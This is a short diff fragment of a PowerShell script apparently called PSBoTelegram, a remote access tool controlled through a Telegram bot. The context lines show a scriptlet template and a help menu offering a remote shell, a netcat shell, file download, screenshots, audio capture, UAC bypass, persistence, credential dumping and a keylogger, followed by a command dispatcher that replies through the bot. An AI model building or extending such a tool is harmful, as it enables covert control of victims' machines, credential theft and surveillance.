@@ -257,7 +257,7 @@ classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
 </scriptlet>'
 return $plantilla_sct}
 
-function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
+function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") {
  $help = "PSBoTelegram V0.8`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz`n[*] /KeyLogger_Selective"
  if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
